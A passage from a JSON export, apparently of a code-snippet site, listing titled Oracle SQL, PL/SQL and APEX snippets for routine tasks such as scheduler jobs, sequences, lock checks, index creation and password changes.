    "keyword": null,
    "link": null,
    "title": " oracle apex debug time",
    "description": "DECLARE     l_value varchar2(100) := 'test value';     l_long_msg VARCHAR2(32767) := 'output anything up to varchar2 limit'; BEGIN     APEX_DEBUG_MESSAGE.ENABLE_DEBUG_MESSAGES(p_level => 3);  -- 1 is most important     APEX_DEBUG_MESSAGE.LOG_MESSAGE(\t\t\t\t\t-- Short message (4000 max)         p_message => 'l_value = ' || l_value, p_level => 1 );      APEX_DEBUG_MESSAGE.LOG_LONG_MESSAGE(         p_message => l_long_msg, p_level => 1 );   \t-- Long message        APEX_DEBUG.INFO('Information message'); END;\nSELECT adb.APEX_USER,        adb.APPLICATION_ID, wal.APPLICATION_NAME, adb.PAGE_ID,        adb.MESSAGE, adb.MESSAGE_TIMESTAMP,        adb.PAGE_VIEW_ID, adb.SESSION_ID FROM APEX_WORKSPACE_ACTIVITY_LOG wal INNER JOIN APEX_DEBUG_MESSAGES adb ON wal.DEBUG_PAGE_VIEW_ID = adb.PAGE_VIEW_ID;\n",
    "reg_date": "2021-10-12T09:58:03.000Z"
  },
  {
    "id": 2647,
    "keyword": null,
    "link": null,
    "title": " oracle apex delete collections",
    "description": "BEGIN     APEX_COLLECTION.DELETE_COLLECTION(p_collection_name => 'EMPLOYEE_CL');     -- All collections belonging to current session     APEX_COLLECTION.DELETE_ALL_COLLECTIONS_SESSION;     -- All collections belonging to current user     APEX_COLLECTION.DELETE_ALL_COLLECTIONS; END;\n",
    "reg_date": "2021-10-12T09:58:03.000Z"
  },
  {
    "id": 2648,
    "keyword": null,
    "link": null,
    "title": " oracle apex format date axis",
    "description": "# At graph level: Attributes [Tab] >>> Time Axis Type > Enabled Axis > x >>> select Date - Short > Pattern > 'dd/MM'  # Standard format: yyyy-MM-dd HH:mm:ss\n",
    "reg_date": "2021-10-12T09:58:03.000Z"
  },
  {
    "id": 2649,
    "keyword": null,
    "link": null,
    "title": " oracle apex grant access to application",
    "description": "Shared Components > Security > Application Access Control     > Add User Role Assignment\n",
    "reg_date": "2021-10-12T09:58:03.000Z"
  },
  {
    "id": 2650,
    "keyword": null,
    "link": null,
    "title": " oracle apex message quit website",
    "description": "SELECT APPLICATION_ID, PAGE_ID, WARN_ON_UNSAVED_CHANGES  FROM APEX_APPLICATION_PAGES WHERE APPLICATION_ID = <application_id>;  SELECT APPLICATION_ID, PAGE_ID, ITEM_NAME, WARN_ON_UNSAVED_CHANGES FROM APEX_APPLICATION_PAGE_ITEMS WHERE ITEM_NAME = <item_name>; -- Page Designer > Page > Warn on Unsaved Changes\n",
    "reg_date": "2021-10-12T09:58:03.000Z"
  },
  {
    "id": 2651,
    "keyword": null,
    "link": null,
    "title": " oracle apex navigation menu horizontal",
    "description": "Shared Components > User Interface > User Interface Attributes > Navigation Menu\n",
    "reg_date": "2021-10-12T09:58:04.000Z"
  },
  {
    "id": 2652,
    "keyword": null,
    "link": null,
    "title": " oracle apex prevent initial load",
    "description": "-- 1. Put a HIDDEN field P1_IS_LOADED in the region  -- 2. Requesting datas in region becomes: SELECT /* your columns */   FROM /* your tables */ WHERE 1 = 1    AND nvl(:P1_IS_LOADED, 'N') = 'Y'     -- 3. At page level: >> Post-Rendering > After Regions > Computation > add one computation with:  \tComputation: Static Value: Y\n",
    "reg_date": "2021-10-12T09:58:04.000Z"
  },
  {
    "id": 2653,
    "keyword": null,
    "link": null,
    "title": " oracle apex rest api",
    "description": "CREATE OR REPLACE FUNCTION add_numbers (p_int_1  IN  NUMBER,                                         p_int_2  IN  NUMBER)   RETURN NUMBER AS   l_clob    CLOB;   l_result  VARCHAR2(32767); BEGIN    -- Get the XML response from the web service.   l_clob := APEX_WEB_SERVICE.make_rest_request(     p_url         => 'http://oracle-base.com/webservices/add-numbers.php',     p_http_method => 'GET',     p_parm_name   => APEX_UTIL.string_to_table('p_int_1:p_int_2'),     p_parm_value  => APEX_UTIL.string_to_table(p_int_1 || ':' || p_int_2)   );    -- Display the whole document returned.   DBMS_OUTPUT.put_line('l_clob=' || l_clob);    -- Pull out the specific value of interest.   l_result := APEX_WEB_SERVICE.parse_xml(     p_xml   => XMLTYPE(l_clob),     p_xpath => '//answer/number/text()'   );    DBMS_OUTPUT.put_line('l_result=' || l_result);    RETURN TO_NUMBER(l_result); END; /\n",
    "reg_date": "2021-10-12T09:58:04.000Z"
  },
  {
    "id": 2654,
    "keyword": null,
    "link": null,
    "title": " oracle apex version view",
    "description": "SELECT * FROM apex_release;\n",
    "reg_date": "2021-10-12T09:58:04.000Z"
  },
  {
    "id": 2655,
    "keyword": null,
    "link": null,
    "title": " oracle apex warn on unsaved changes",
    "description": "SELECT APPLICATION_ID, PAGE_ID, WARN_ON_UNSAVED_CHANGES  FROM APEX_APPLICATION_PAGES WHERE APPLICATION_ID = <application_id>;  SELECT APPLICATION_ID, PAGE_ID, ITEM_NAME, WARN_ON_UNSAVED_CHANGES FROM APEX_APPLICATION_PAGE_ITEMS WHERE ITEM_NAME = <item_name>; -- Page Designer > Page > Warn on Unsaved Changes\n",
    "reg_date": "2021-10-12T09:58:04.000Z"
  },
  {
    "id": 2656,
    "keyword": null,
    "link": null,
    "title": " oracle apex warning message",
    "description": "SELECT APPLICATION_ID, PAGE_ID, WARN_ON_UNSAVED_CHANGES  FROM APEX_APPLICATION_PAGES WHERE APPLICATION_ID = <application_id>;  SELECT APPLICATION_ID, PAGE_ID, ITEM_NAME, WARN_ON_UNSAVED_CHANGES FROM APEX_APPLICATION_PAGE_ITEMS WHERE ITEM_NAME = <item_name>; -- Page Designer > Page > Warn on Unsaved Changes\n",
    "reg_date": "2021-10-12T09:58:04.000Z"
  },
  {
    "id": 2657,
    "keyword": null,
    "link": null,
    "title": " oracle array",
    "description": "declare    type array_t is varray(3) of varchar2(10);    array array_t := array_t('Matt', 'Joanne', 'Robert'); begin    for i in 1..array.count loop        dbms_output.put_line(array(i));    end loop; end;\n",
    "reg_date": "2021-10-12T09:58:04.000Z"
  },
  {
    "id": 2658,
    "keyword": null,
    "link": null,
    "title": " oracle asynchronous procedure",
    "description": "-- To call a procedure asynchronously, create a auto_drop job: BEGIN     DBMS_SCHEDULER.create_job(             job_name => 'My_JOB_NAME',             job_type => 'PLSQL_BLOCK',             job_action => 'BEGIN my_procedure(); END;',             start_date => systimestamp,             auto_drop => TRUE,             enabled => TRUE         ); END;\n",
    "reg_date": "2021-10-12T09:58:04.000Z"
  },
  {
    "id": 2659,
    "keyword": null,
    "link": null,
    "title": " oracle asynchronous query",
    "description": "-- To call a procedure asynchronously, create a auto_drop job: BEGIN     DBMS_SCHEDULER.create_job(             job_name => 'My_JOB_NAME',             job_type => 'PLSQL_BLOCK',             job_action => 'BEGIN my_procedure(); END;',             start_date => systimestamp,             auto_drop => TRUE,             enabled => TRUE         ); END;\n",
    "reg_date": "2021-10-12T09:58:05.000Z"
  },
  {
    "id": 2660,
    "keyword": null,
    "link": null,
    "title": " oracle asynchronous update",
    "description": "-- To call a procedure asynchronously, create a auto_drop job: BEGIN     DBMS_SCHEDULER.create_job(             job_name => 'My_JOB_NAME',             job_type => 'PLSQL_BLOCK',             job_action => 'BEGIN my_procedure(); END;',             start_date => systimestamp,             auto_drop => TRUE,             enabled => TRUE         ); END;\n",
    "reg_date": "2021-10-12T09:58:05.000Z"
  },
  {
    "id": 2661,
    "keyword": null,
    "link": null,
    "title": " oracle auto increment",
    "description": "-- Use a sequence: CREATE SEQUENCE id_seq START WITH 1; INSERT INTO my_table (ID, VALUE) VALUES (id_seq.NEXTVAL, 'My value');\n-- For oracle 12c or later  -- auto inc create table t1 (     c1 NUMBER GENERATED by default on null as IDENTITY,     c2 VARCHAR2(10)     ); -- More options for initial value and increment value create table t1 (     c1 NUMBER GENERATED ALWAYS as IDENTITY(START with 1 INCREMENT by 1),     c2 VARCHAR2(10)     );\n",
    "reg_date": "2021-10-12T09:58:05.000Z"
  },
  {
    "id": 2662,
    "keyword": null,
    "link": null,
    "title": " oracle auto increment primary key",
    "description": "-- Use a sequence: CREATE SEQUENCE id_seq START WITH 1; INSERT INTO my_table (ID, VALUE) VALUES (id_seq.NEXTVAL, 'My value');\nCREATE TABLE auto_increment_column_table (  auto_increment_column_id NUMBER GENERATED ALWAYS AS IDENTITY,  auto_increment_column_description VARCHAR2(50) );\n",
    "reg_date": "2021-10-12T09:58:05.000Z"
  },
  {
    "id": 2663,
    "keyword": null,
    "link": null,
    "title": " oracle avg",
    "description": "SELECT AVG(col_name) FROM table_name;  SELECT customer, AVG(prices)  FROM buys  GROUP BY customer;\n",
    "reg_date": "2021-10-12T09:58:05.000Z"
  },
  {
    "id": 2664,
    "keyword": null,
    "link": null,
    "title": " oracle block",
    "description": "set serveroutput on; DECLARE    v_result NUMBER; BEGIN    v_result := 1 / 0;    DBMS_OUTPUT.PUT_LINE( v_result ); EXCEPTION    WHEN ZERO_DIVIDE THEN       DBMS_OUTPUT.PUT_LINE( SQLERRM ); END;\n",
    "reg_date": "2021-10-12T09:58:05.000Z"
  },
  {
    "id": 2665,
    "keyword": null,
    "link": null,
    "title": " oracle calculated column",
    "description": "CREATE TABLE T1 (     ID          NUMBER,     PRODUCT     VARCHAR2(50),     PRICE       NUMBER(10, 2),     TAXED_PRICE NUMBER(10, 2) GENERATED ALWAYS AS (round(PRICE * 1.2, 2)) VIRTUAL ); INSERT INTO T1 (ID, PRODUCT, PRICE) VALUES (1, 'Spoon', 12);\n",
    "reg_date": "2021-10-12T09:58:05.000Z"
  },
  {
    "id": 2666,
    "keyword": null,
    "link": null,
    "title": " oracle cannot access v$session",
    "description": "GRANT SELECT ON V$SESSION TO my_user;\n",
    "reg_date": "2021-10-12T09:58:06.000Z"
  },
  {
    "id": 2667,
    "keyword": null,
    "link": null,
    "title": " oracle case",
    "description": "SELECT product_id, product_type_id,   CASE product_type_id     WHEN 1 THEN 'Book'     WHEN 2 THEN 'Video'     WHEN 3 THEN 'DVD'     WHEN 4 THEN 'CD'     ELSE 'Magazine'   END FROM products;\n",
    "reg_date": "2021-10-12T09:58:06.000Z"
  },
  {
    "id": 2668,
    "keyword": null,
    "link": null,
    "title": " oracle change expired password sql developer",
    "description": "-- Changes password for the schema.  -- Add double quotes to new_password in case of special characters ALTER USER my_user IDENTIFIED BY new_password; -- Unlock a user ALTER USER my_user ACCOUNT UNLOCK; -- Unlock and change password ALTER USER my_user IDENTIFIED BY new_password ACCOUNT UNLOCK; -- Force user to change password at first login ALTER USER my_user IDENTIFIED BY PASSWORD EXPIRE;\n",
    "reg_date": "2021-10-12T09:58:06.000Z"
  },
  {
    "id": 2669,
    "keyword": null,
    "link": null,
    "title": " oracle change nls date format permanently",
    "description": "-- Date format for session ALTER SESSION SET NLS_DATE_FORMAT='DD/MM/YYYY HH24:MI:SS';\n",
    "reg_date": "2021-10-12T09:58:06.000Z"
  },
  {
    "id": 2670,
    "keyword": null,
    "link": null,
    "title": " oracle change password",
    "description": "-- Changes password for the schema.  -- Add double quotes to new_password in case of special characters ALTER USER my_user IDENTIFIED BY new_password; -- Unlock a user ALTER USER my_user ACCOUNT UNLOCK; -- Unlock and change password ALTER USER my_user IDENTIFIED BY new_password ACCOUNT UNLOCK; -- Force user to change password at first login ALTER USER my_user IDENTIFIED BY PASSWORD EXPIRE;\n oracle_sid=hcltss\n",
    "reg_date": "2021-10-12T09:58:06.000Z"
  },
  {
    "id": 2671,
    "keyword": null,
    "link": null,
    "title": " oracle character index",
    "description": "-- EXAMPLE select  \t'0004V0' as TESTER \t, INSTR('0004V0','V') -- OUTPUT: 5 \t, INSTR('0004V0','0') -- OUTPUT: 1 \t, INSTR('0004V0','0',4) -- OUTPUT: 6 from DUAL;  -- SYNTAX INSTR(/*Main string*/, /*substring*/, /*start index*/)\n",
    "reg_date": "2021-10-12T09:58:06.000Z"
  },
  {
    "id": 2672,
    "keyword": null,
    "link": null,
    "title": " oracle character set",
    "description": "SELECT * FROM nls_database_parameters WHERE PARAMETER = 'NLS_CHARACTERSET'; SELECT * FROM v$nls_parameters WHERE PARAMETER = 'NLS_CHARACTERSET'; -- NLS_CHARACTERSET for VARCHAR2, NLS_NCHAR_CHARACTERSET for NVARCHAR2 SELECT * FROM database_properties WHERE PROPERTY_NAME     IN ('NLS_CHARACTERSET', 'NLS_NCHAR_CHARACTERSET');\n",
    "reg_date": "2021-10-12T09:58:06.000Z"
  },
  {
    "id": 2673,
    "keyword": null,
    "link": null,
    "title": " oracle check table lock",
    "description": "select t2.username, t2.sid, t2.serial#, t3.object_name, t2.OSUSER, t2.MACHINE, t2.PROGRAM, t2.COMMAND, t2.LAST_CALL_ET  from v$locked_object t1, v$session t2, dba_objects t3  where t1.session_id = t2.sid and t1.object_id = t3.object_id   ORDER BY t2.logon_time;\n-- Oracle: Locked objects SELECT vs.USERNAME, vs.OSUSER, vh.SID LOCKING_SID, vs.STATUS STATUS,        vs.MODULE MODULE, vs.PROGRAM PROGRAM_HOLDING, jrh.JOB_NAME, vsw.USERNAME,        vsw.OSUSER, vw.SID WAITER_SID, vsw.PROGRAM PROGRAM_WAITING, jrw.JOB_NAME FROM V$LOCK vh,      V$LOCK vw,      V$SESSION vs,      V$SESSION vsw,      DBA_SCHEDULER_RUNNING_JOBS jrh,      DBA_SCHEDULER_RUNNING_JOBS jrw WHERE (vh.ID1,        vh.ID2) IN (           SELECT ID1, ID2           FROM V$LOCK           WHERE REQUEST = 0           INTERSECT           SELECT ID1, ID2           FROM V$LOCK           WHERE LMODE = 0       )   AND vh.ID1 = vw.ID1   AND vh.ID2 = vw.ID2   AND vh.REQUEST = 0   AND vw.LMODE = 0   AND vh.SID = vs.SID   AND vw.SID = vsw.SID   AND vh.SID = jrh.SESSION_ID (+)   AND vw.SID = jrw.SESSION_ID (+);\n",
    "reg_date": "2021-10-12T09:58:06.000Z"
  },
  {
    "id": 2674,
    "keyword": null,
    "link": null,
    "title": " oracle column comment",
    "description": "COMMENT ON COLUMN TABLE_NAME.MY_COLUMN IS 'A column comment'; SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME'; -- All schema columns: SELECT t.OWNER, t.TABLE_NAME, c.COLUMN_NAME, com.COMMENTS FROM DBA_TABLES t LEFT JOIN DBA_TAB_COLUMNS c     ON c.OWNER = t.OWNER AND c.TABLE_NAME = t.TABLE_NAME LEFT JOIN DBA_COL_COMMENTS com ON com.OWNER = c.OWNER AND com.TABLE_NAME = c.TABLE_NAME     AND com.COLUMN_NAME = c.COLUMN_NAME WHERE t.OWNER = 'MY_OWNER' AND t.DROPPED = 'NO' ORDER BY t.OWNER, t.TABLE_NAME, c.COLUMN_NAME;\nSELECT * FROM ALL_TAB_COMMENTS WHERE TABLE_NAME = 'MY_TABLE';  -- Table comment SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'MY_TABLE';  -- Columns comments  -- All owner tables: SELECT t.OWNER, t.TABLE_NAME, com.COMMENTS FROM DBA_TABLES t LEFT JOIN DBA_TAB_COMMENTS com ON com.OWNER = t.OWNER AND com.TABLE_NAME = t.TABLE_NAME WHERE t.OWNER = 'TRANSFERT_DOAAT' AND t.DROPPED = 'NO' ORDER BY t.OWNER, t.TABLE_NAME;\n",
    "reg_date": "2021-10-12T09:58:06.000Z"
  },
  {
    "id": 2675,
    "keyword": null,
    "link": null,
    "title": " oracle columns in all tables",
    "description": "-- Depending on connected user grants: SELECT * FROM USER_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- User tables SELECT * FROM ALL_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- Available to user SELECT * FROM DBA_TAB_COLS WHERE TABLE_NAME = 'my_table';\t-- All schemas  -- Columns from all tables in a schema (adapt with USER_..., DBA_... or ALL_...): SELECT c.TABLE_NAME, c.DATA_TYPE FROM ALL_TAB_COLS c JOIN ALL_TABLES t ON t.OWNER = c.OWNER WHERE OWNER = 'my_schema';\n",
    "reg_date": "2021-10-12T09:58:07.000Z"
  },
  {
    "id": 2676,
    "keyword": null,
    "link": null,
    "title": " oracle columns table",
    "description": "SELECT * FROM USER_TAB_COLS WHERE TABLE_NAME = 'my_table'; SELECT * FROM ALL_TAB_COLS WHERE TABLE_NAME = 'my_table'; SELECT * FROM DBA_TAB_COLS WHERE TABLE_NAME = 'my_table';\n",
    "reg_date": "2021-10-12T09:58:07.000Z"
  },
  {
    "id": 2677,
    "keyword": null,
    "link": null,
    "title": " oracle comment on view",
    "description": "COMMENT ON TABLE view_name IS 'A view comment'; COMMENT ON COLUMN view_name.MY_COLUMN IS 'A column comment';  SELECT * FROM ALL_TAB_COMMENTS WHERE TABLE_NAME = 'VIEW_NAME'; SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'VIEW_NAME';\n",
    "reg_date": "2021-10-12T09:58:07.000Z"
  },
  {
    "id": 2678,
    "keyword": null,
    "link": null,
    "title": " oracle compare tables",
    "description": "(SELECT * FROM T1 MINUS SELECT * FROM T2)   -- Rows that are in T1 but not in T2 UNION ALL (SELECT * FROM T2 MINUS SELECT * FROM T1);  -- Rows that are in T2 but not in T1\n",
    "reg_date": "2021-10-12T09:58:07.000Z"
  },
  {
    "id": 2679,
    "keyword": null,
    "link": null,
    "title": " oracle compile package",
    "description": "ALTER PACKAGE schema_name.package_name COMPILE PACKAGE; ALTER PACKAGE schema_name.package_name COMPILE BODY;\n",
    "reg_date": "2021-10-12T09:58:07.000Z"
  },
  {
    "id": 2680,
    "keyword": null,
    "link": null,
    "title": " oracle compile procedure",
    "description": "ALTER PROCEDURE schema_name.procedure_name COMPILE;\n",
    "reg_date": "2021-10-12T09:58:07.000Z"
  },
  {
    "id": 2681,
    "keyword": null,
    "link": null,
    "title": " oracle compile schema",
    "description": "-- Compiles all objects of a schema BEGIN \t-- compile_all: true compiles all, false compiles invalid objects only \tDBMS_UTILITY.compile_schema(schema => 'My_SCHEMA', compile_all => true); END;\n",
    "reg_date": "2021-10-12T09:58:07.000Z"
  },
  {
    "id": 2682,
    "keyword": null,
    "link": null,
    "title": " oracle compile whole schema",
    "description": "-- Compiles all objects of a schema BEGIN \t-- compile_all: true compiles all, false compiles invalid objects only \tDBMS_UTILITY.compile_schema(schema => 'My_SCHEMA', compile_all => true); END;\n",
    "reg_date": "2021-10-12T09:58:07.000Z"
  },
  {
    "id": 2683,
    "keyword": null,
    "link": null,
    "title": " oracle concat datetime",
    "description": "SELECT TO_DATE(TO_CHAR(t.fromdate,'dd-mm-yyyy') ||                ' ' ||                TO_CHAR(t.fromtime,'hh24:mi:ss'),'dd-mm-yyyy hh24:mi:ss') as full_date_col  FROM YourTable t\n",
    "reg_date": "2021-10-12T09:58:08.000Z"
  },
  {
    "id": 2684,
    "keyword": null,
    "link": null,
    "title": " oracle connect by",
    "description": "SELECT trunc(sysdate) + level FROM DUAL CONNECT BY level <= 10;\n",
    "reg_date": "2021-10-12T09:58:08.000Z"
  },
  {
    "id": 2685,
    "keyword": null,
    "link": null,
    "title": " oracle connect by level",
    "description": "SELECT trunc(sysdate) + level FROM DUAL CONNECT BY level <= 10;\n",
    "reg_date": "2021-10-12T09:58:08.000Z"
  },
  {
    "id": 2686,
    "keyword": null,
    "link": null,
    "title": " oracle console",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T09:58:08.000Z"
  },
  {
    "id": 2687,
    "keyword": null,
    "link": null,
    "title": " oracle control file",
    "description": "SELECT substr(NAME, 1, 100) CONTROL_FILE,        nvl(STATUS, 'Unknown'),        (BLOCK_SIZE * FILE_SIZE_BLKS) / 1e6 SIZE_MB FROM V$CONTROLFILE ORDER BY 1;\n",
    "reg_date": "2021-10-12T09:58:08.000Z"
  },
  {
    "id": 2688,
    "keyword": null,
    "link": null,
    "title": " oracle control file size",
    "description": "SELECT substr(NAME, 1, 100) CONTROL_FILE,        nvl(STATUS, 'Unknown'),        (BLOCK_SIZE * FILE_SIZE_BLKS) / 1e6 SIZE_MB FROM V$CONTROLFILE ORDER BY 1;\n",
    "reg_date": "2021-10-12T09:58:08.000Z"
  },
  {
    "id": 2689,
    "keyword": null,
    "link": null,
    "title": " oracle convert run duration to number",
    "description": "-- Duration between 2 timestamps SELECT (extract(DAY FROM TIME2 - TIME1) * 24 * 60 * 60)             + (extract(HOUR FROM TIME2 - TIME1) * 60 * 60)             + (extract(MINUTE FROM TIME2 - TIME1) * 60)             + extract(SECOND FROM TIME2 - TIME1) FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:08.000Z"
  },
  {
    "id": 2690,
    "keyword": null,
    "link": null,
    "title": " oracle convert string number",
    "description": "SELECT to_number('1') FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:08.000Z"
  },
  {
    "id": 2691,
    "keyword": null,
    "link": null,
    "title": " oracle copy table",
    "description": "CREATE TABLE New_Table_name AS SELECT * FROM Existing_table_Name; \n-- Copy a table (datas, columns and storage parameters) CREATE TABLE my_new_table AS SELECT * FROM my_source_table; -- Use NOLOGGING, and PARALLEL if allowed for faster copy CREATE TABLE my_new_table     PARALLEL 10 NOLOGGING AS SELECT /*+ parallel(10) */ * FROM my_source_table; -- To create an empty table: CREATE TABLE my_new_table AS SELECT * FROM my_source_table \tWHERE rownum = 0;\n",
    "reg_date": "2021-10-12T09:58:08.000Z"
  },
  {
    "id": 2692,
    "keyword": null,
    "link": null,
    "title": " oracle cpu per session",
    "description": "SELECT ss.USERNAME, se.SID, se.VALUE / 100 CPU_USAGE_SECONDS FROM V$SESSION ss, V$SESSTAT se, V$STATNAME sn WHERE se.STATISTIC# = sn.STATISTIC#   AND NAME LIKE '%CPU used by this session%'   AND se.SID = ss.SID   AND ss.STATUS = 'ACTIVE'   AND ss.USERNAME IS NOT NULL ORDER BY VALUE DESC;\n",
    "reg_date": "2021-10-12T09:58:08.000Z"
  },
  {
    "id": 2693,
    "keyword": null,
    "link": null,
    "title": " oracle cpu time",
    "description": "SELECT PARSING_SCHEMA_NAME, MODULE, SQL_ID,  \t   round(((CPU_TIME / 1e6) / 60), 2) AS CPU_TIME,        EXECUTIONS, ROWS_PROCESSED, DISK_READS, FIRST_LOAD_TIME,        LAST_LOAD_TIME, OPTIMIZER_COST, SQL_FULLTEXT FROM V$SQLAREA WHERE PARSING_SCHEMA_NAME IN ('schema_name') ORDER BY PARSING_SCHEMA_NAME, CPU_TIME DESC;\n",
    "reg_date": "2021-10-12T09:58:09.000Z"
  },
  {
    "id": 2694,
    "keyword": null,
    "link": null,
    "title": " oracle cpu usage",
    "description": "SELECT PARSING_SCHEMA_NAME, MODULE, SQL_ID,  \t   round(((CPU_TIME / 1e6) / 60), 2) AS CPU_TIME,        EXECUTIONS, ROWS_PROCESSED, DISK_READS, FIRST_LOAD_TIME,        LAST_LOAD_TIME, OPTIMIZER_COST, SQL_FULLTEXT FROM V$SQLAREA WHERE PARSING_SCHEMA_NAME IN ('schema_name') ORDER BY PARSING_SCHEMA_NAME, CPU_TIME DESC;\n",
    "reg_date": "2021-10-12T09:58:09.000Z"
  },
  {
    "id": 2695,
    "keyword": null,
    "link": null,
    "title": " oracle create as select",
    "description": "-- Copy a table (datas, columns and storage parameters) CREATE TABLE my_new_table AS SELECT * FROM my_source_table; -- Use NOLOGGING, and PARALLEL if allowed for faster copy CREATE TABLE my_new_table     PARALLEL 10 NOLOGGING AS SELECT /*+ parallel(10) */ * FROM my_source_table; -- To create an empty table: CREATE TABLE my_new_table AS SELECT * FROM my_source_table \tWHERE rownum = 0;\nCREATE TABLE my_table AS SELECT * FROM another_table t WHERE 1=2 --delete the where condition if you also want the data\n",
    "reg_date": "2021-10-12T09:58:09.000Z"
  },
  {
    "id": 2696,
    "keyword": null,
    "link": null,
    "title": " oracle create chain step",
    "description": "BEGIN DBMS_SCHEDULER.DEFINE_CHAIN_STEP (    chain_name      =>  'my_chain1',    step_name       =>  'my_step1',    program_name    =>  'my_program1'); DBMS_SCHEDULER.DEFINE_CHAIN_STEP (    chain_name      =>  'my_chain1',    step_name       =>  'my_step2',    program_name    =>  'my_chain2'); END;\nBEGIN DBMS_SCHEDULER.CREATE_CHAIN (    chain_name          => 'my_chain1',    rule_set_name       => NULL,    evaluation_interval => NULL,    comments            => 'My first chain'); END;\n",
    "reg_date": "2021-10-12T09:58:09.000Z"
  },
  {
    "id": 2697,
    "keyword": null,
    "link": null,
    "title": " oracle create datafile",
    "description": "SELECT * FROM DBA_DATA_FILES WHERE TABLESPACE_NAME = 'my_tbs' ORDER BY FILE_NAME;  ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF; -- Autoextend with max size: ALTER TABLESPACE my_tbs ADD DATAFILE '/path/to/my_file.dbf'  \tSIZE 10G AUTOEXTEND ON NEXT 1G MAXSIZE 32000M;     -- For TEMP tablespace: ALTER TABLESPACE my_tbs ADD TEMPFILE '/path/to/my_file.dbf'  \tSIZE 100M AUTOEXTEND OFF;\n",
    "reg_date": "2021-10-12T09:58:09.000Z"
  },
  {
    "id": 2698,
    "keyword": null,
    "link": null,
    "title": " oracle create directory",
    "description": "CREATE [OR REPLACE] DIRECTORY directory_name AS 'path_name';  SELECT * FROM DBA_DIRECTORIES WHERE DIRECTORY_NAME LIKE '%MY_PATH%';\n",
    "reg_date": "2021-10-12T09:58:09.000Z"
  },
  {
    "id": 2699,
    "keyword": null,
    "link": null,
    "title": " oracle create index",
    "description": "CREATE INDEX my_index_name ON my_table (colName) TABLESPACE my_tablespace; -- Default tablespace is USER CREATE INDEX my_index_name ON my_table (trunc(myDateCol)); -- With parallelism CREATE INDEX my_index_name ON my_table (colName) PARALLEL 8;\nCREATE INDEX new_index_name ON table_name (column_name)\n",
    "reg_date": "2021-10-12T09:58:09.000Z"
  },
  {
    "id": 2700,
    "keyword": null,
    "link": null,
    "title": " oracle create index parallel",
    "description": "CREATE INDEX my_index_name ON my_table (colName) TABLESPACE my_tablespace; -- Default tablespace is USER CREATE INDEX my_index_name ON my_table (trunc(myDateCol)); -- With parallelism CREATE INDEX my_index_name ON my_table (colName) PARALLEL 8;\n",
    "reg_date": "2021-10-12T09:58:09.000Z"
  },
  {
    "id": 2701,
    "keyword": null,
    "link": null,
    "title": " oracle create job example",
    "description": "BEGIN     DBMS_SCHEDULER.CREATE_JOB(       job_name => '\"MYSCHEMA\".\"JOB_NAME\"',       job_type => 'STORED_PROCEDURE',       job_action => 'MYSCHEMA.PROCEDURE',       number_of_arguments => 0,       start_date => to_timestamp_tz(         '2021-04-08 14:19:32.000000000 EUROPE/PARIS',          'YYYY-MM-DD HH24:MI:SS.FF TZR'),       repeat_interval =>        'FREQ=DAILY;BYDAY=MON,TUE,WED,THU,FRI;BYHOUR=12;BYMINUTE=30;BYSECOND=0',       end_date => NULL,       enabled => FALSE,       auto_drop => FALSE,       comments => 'Job description');      DBMS_SCHEDULER.enable(             name => '\"MYSCHEMA\".\"JOB_NAME\"'); END;\n",
    "reg_date": "2021-10-12T09:58:09.000Z"
  },
  {
    "id": 2702,
    "keyword": null,
    "link": null,
    "title": " oracle create procedure example",
    "description": "CREATE OR REPLACE PROCEDURE my_schema.my_procedure(param1 IN VARCHAR2) IS     cnumber NUMBER; BEGIN     cnumber := 10;     INSERT INTO my_table (num_field) VALUES (param1 + cnumber);     COMMIT; EXCEPTION     WHEN OTHERS THEN         raise_application_error(-20001, 'An error was encountered - '             || sqlcode || ' -ERROR- ' || sqlerrm); END;\n-- Oracle  -- EXAMPLE CREATE OR REPLACE PROCEDURE select_employees() BEGIN    select *     from employees     limit 1000; -- Remember, the delimiters within the stored procedure remain ; END;  /* SYNTAX CREATE OR REPLACE PROCEDURE <Your-procedure-name>(<argument1><argument2>...<argumentN>) BEGIN    <Code-that-stored-procedure-executes>; -- Remember, the delimiters within the stored procedure remain ; END; */\n",
    "reg_date": "2021-10-12T09:58:09.000Z"
  },
  {
    "id": 2703,
    "keyword": null,
    "link": null,
    "title": " oracle create program",
    "description": "BEGIN   -- PL/SQL Block.   DBMS_SCHEDULER.create_program (     program_name   => 'test_plsql_block_prog',     program_type   => 'PLSQL_BLOCK',     program_action => 'BEGIN my_job_proc(''CREATE_PROGRAM (BLOCK)''); END;',     enabled        => TRUE,     comments       => 'CREATE_PROGRAM test using a PL/SQL block.'); END;\n",
    "reg_date": "2021-10-12T09:58:10.000Z"
  },
  {
    "id": 2704,
    "keyword": null,
    "link": null,
    "title": " oracle create program if no exists",
    "description": "DECLARE     existing_program NUMBER; BEGIN     SELECT count(*) INTO existing_program     FROM ALL_SCHEDULER_PROGRAMS WHERE PROGRAM_NAME = 'prog_name' AND OWNER='owner';     IF existing_program = 1 THEN         dbms_scheduler.DROP_PROGRAM(PROGRAM_NAME => 'prog_name');     END IF; END; / BEGIN DBMS_SCHEDULER.create_program(program_name => 'owner.prog_name', ...); END;\n",
    "reg_date": "2021-10-12T09:58:10.000Z"
  },
  {
    "id": 2705,
    "keyword": null,
    "link": null,
    "title": " oracle create program if not exists",
    "description": "DECLARE     existing_program NUMBER; BEGIN     SELECT count(*) INTO existing_program     FROM ALL_SCHEDULER_PROGRAMS WHERE PROGRAM_NAME = 'prog_name' AND OWNER='owner';     IF existing_program = 1 THEN         dbms_scheduler.DROP_PROGRAM(PROGRAM_NAME => 'prog_name');     END IF; END; / BEGIN DBMS_SCHEDULER.create_program(program_name => 'owner.prog_name', ...); END;\n",
    "reg_date": "2021-10-12T09:58:10.000Z"
  },
  {
    "id": 2706,
    "keyword": null,
    "link": null,
    "title": " oracle create role",
